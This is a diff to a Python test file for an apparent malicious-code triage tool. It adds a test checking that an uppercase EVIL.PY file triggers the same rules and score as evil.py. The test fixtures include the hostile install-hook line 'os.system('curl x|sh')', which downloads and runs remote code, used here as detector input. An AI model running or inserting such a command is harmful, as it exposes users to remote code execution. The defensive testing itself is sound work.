@@ -32,6 +32,16 @@ def test_install_hook_escalates():
     assert triage(_code("setup.py", ["import os", "os.system('curl x|sh')"]), Config(), RULES).escalate
 
 
+def test_install_hook_escalates_the_same_for_an_uppercase_py_extension():
+    # An in-cap EVIL.PY enters fetcher's `files` (fetcher._is_source lowercases), so it must be
+    # scored and ranked as code identically to evil.py -- not silently treated as a non-code file.
+    added = ["import os", "os.system('curl x|sh')"]
+    lower = triage(_code("p/evil.py", added), Config(), RULES)
+    upper = triage(_code("p/EVIL.PY", added), Config(), RULES)
+    assert {fr.rule for fr in lower.fired_rules} == {fr.rule for fr in upper.fired_rules}
+    assert lower.score == upper.score
+
+
 def test_benign_refactor_does_not_escalate():
     r = triage(_code("m/x.py", ["import re, json", "re.compile(P)", "json.loads(B)"]), Config(), RULES)
     assert not r.escalate
